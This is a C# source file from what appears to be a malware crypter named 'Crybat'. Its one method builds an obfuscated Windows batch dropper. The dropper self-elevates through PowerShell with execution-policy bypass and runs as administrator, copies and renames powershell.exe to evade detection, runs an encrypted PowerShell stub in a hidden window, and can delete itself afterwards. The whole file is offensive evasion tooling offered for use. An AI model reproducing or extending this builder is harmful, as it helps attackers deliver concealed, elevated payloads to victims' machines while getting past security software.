using System;
using System.Text;

namespace Crybat
{
    public class FileGen
    {
        public static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, bool selfdelete, bool runas, Random rng)
        {
            string command = StubGen.CreatePS(key, iv, mode, rng);
            StringBuilder output = new StringBuilder();
            output.AppendLine("@echo off");

            if (runas)
            {
                string runascode = 
                    "if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath '%0' -ArgumentList '%cd%' -Verb runas & exit /b )" 
                    + Environment.NewLine
                    + "cd \"%~dp0\"";
                var runasobf = Obfuscator.GenCodeBat(runascode, rng, 3);
                output.AppendLine("net file");
                output.AppendLine(runasobf.Item1 + Environment.NewLine + runasobf.Item2);
            }

            var obfuscated = Obfuscator.GenCodeBat(@"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y ""%~0.exe""", rng, 4);
            output.AppendLine(obfuscated.Item1);

            var obfuscated2 = Obfuscator.GenCodeBat("cd \"%~dp0\"", rng, 4);
            output.AppendLine(obfuscated2.Item1);

            string commandstart = $"-noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -ep bypass -command ";
            var obfuscated3 = Obfuscator.GenCodeBat("\"%~nx0.exe\" " + commandstart + command, rng, 3);
            output.AppendLine(obfuscated3.Item1);

            output.AppendLine(obfuscated.Item2);
            output.AppendLine("cls");
            output.AppendLine(obfuscated2.Item2);
            output.AppendLine(obfuscated3.Item2);

            if (selfdelete) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
            output.Append("exit /b");
            return output.ToString();
        }
    }
}
